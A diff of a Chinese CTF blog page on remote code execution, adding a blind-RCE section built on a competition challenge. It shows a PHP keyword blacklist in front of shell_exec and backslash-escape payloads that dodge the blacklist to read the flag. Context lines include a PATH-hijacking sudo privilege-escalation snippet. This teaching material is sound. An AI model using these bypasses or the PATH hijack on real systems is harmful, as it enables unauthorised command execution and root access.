@@ -28,7 +28,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://azumisaki.github.io/img/11.JPG">
 <meta property="article:published_time" content="2026-04-14T07:29:49.000Z">
-<meta property="article:modified_time" content="2026-05-26T07:00:40.328Z">
+<meta property="article:modified_time" content="2026-06-05T13:42:15.919Z">
 <meta property="article:author" content="AzumiSaki">
 <meta property="article:tag" content="-RCE漏洞">
 <meta name="twitter:card" content="summary_large_image">
@@ -240,7 +240,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          4k 字
+          4.1k 字
         
       </span>
     
@@ -251,7 +251,7 @@
         
         
         
-          33 分钟
+          34 分钟
         
       </span>
     
@@ -297,7 +297,7 @@
               <p id="updated-time" class="note note-info" style="">
                 
                   
-                    本文最后更新于 2026年5月26日 下午
+                    本文最后更新于 2026年6月5日 晚上
                   
                 
               </p>
@@ -675,6 +675,12 @@
 <h4 id="4字符限制绕过"><a href="#4字符限制绕过" class="headerlink" title="4字符限制绕过"></a>4字符限制绕过</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br></code></pre></td></tr></table></figure>
 
 <h4 id="一些简单的提权"><a href="#一些简单的提权" class="headerlink" title="一些简单的提权"></a>一些简单的提权</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 创建一个恶意的 ls 文件</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;#!/bin/bash&#x27;</span> &gt; /tmp/ls<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;/bin/bash&#x27;</span> &gt;&gt; /tmp/ls  <span class="hljs-comment"># 核心 payload：启动一个 bash shell</span><br><br><span class="hljs-comment"># 给恶意文件添加执行权限</span><br><span class="hljs-built_in">chmod</span> +x /tmp/ls<br><br><span class="hljs-comment"># 将 /tmp 目录添加到 PATH 的最前面，这样系统会优先在 /tmp 中查找命令</span><br><span class="hljs-built_in">sudo</span> PATH=/tmp:<span class="hljs-variable">$PATH</span> /var/start.sh<br><br></code></pre></td></tr></table></figure>
+
+<h2 id="无回显rce"><a href="#无回显rce" class="headerlink" title="无回显rce"></a>无回显rce</h2><h3 id="例：浙江警察学院第九届信息网络安全竞赛-ezshell："><a href="#例：浙江警察学院第九届信息网络安全竞赛-ezshell：" class="headerlink" title="例：浙江警察学院第九届信息网络安全竞赛-ezshell："></a>例：浙江警察学院第九届信息网络安全竞赛-ezshell：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(__file__);<br><span class="hljs-variable">$black_list</span>=[<span class="hljs-string">&#x27;eval&#x27;</span>,<span class="hljs-string">&#x27;system&#x27;</span>,<span class="hljs-string">&#x27;cat&#x27;</span>,<span class="hljs-string">&#x27;tac&#x27;</span>,<span class="hljs-string">&#x27;ls&#x27;</span>,<span class="hljs-string">&#x27;tail&#x27;</span>,<span class="hljs-string">&#x27;more&#x27;</span>,<span class="hljs-string">&#x27;less&#x27;</span>,<span class="hljs-string">&#x27;nl&#x27;</span>];<br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;t0mcater&#x27;</span>];<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">9</span>;<span class="hljs-variable">$i</span>++)&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$a</span>, <span class="hljs-variable">$black_list</span>[<span class="hljs-variable">$i</span>]) !== <span class="hljs-literal">false</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;bad hacker!&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure>
+
+<p>我们通过测试可以发现这道题目没回显，怎么办</p>
+<p>1.可以用<code>\</code>来绕过，比如</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">ca\t /f*&gt;1.txt<br>l\s / &gt;1.txt<br></code></pre></td></tr></table></figure>
 
 
                 
